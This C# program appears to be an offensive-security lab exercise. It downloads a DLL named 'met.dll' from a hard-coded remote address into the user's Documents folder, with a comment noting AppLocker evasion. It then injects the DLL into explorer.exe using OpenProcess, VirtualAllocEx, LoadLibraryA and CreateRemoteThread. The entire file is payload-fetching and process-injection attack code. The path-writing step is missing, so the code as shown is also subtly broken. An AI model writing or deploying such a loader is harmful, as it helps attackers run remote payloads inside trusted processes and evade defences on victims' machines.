using System.Diagnostics;
using System.Net;
using System.Reflection.Metadata;
using System.Runtime.InteropServices;
using System.Security.Permissions;

public class Program
{

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(
      int dwDesiredAccess,
      bool bInheritHandle,
      int dwProcessId
    );

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect
    );

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
       IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
       IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    public static void Main(string[] args)
    {
        // get MyDocuments directory and download there - modify in case of AppLocker
        String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        String dllName = dir + "\\met.dll";

        // we will download the DLL from remote
        WebClient wc = new WebClient();
        wc.DownloadFile("http://192.168.109.44:8082/met.dll", dllName);

        // we will inject into explorer
        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);

        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

        IntPtr threadId = 0x00000000;

        IntPtr hThread = CreateRemoteThread(
            hProcess,
            IntPtr.Zero,
            0,
            loadLib, // adresa functiei LoadLibraryA
            addr,    // adresa care retine calea catre DLL
            0,
            out threadId
        );
    }

}
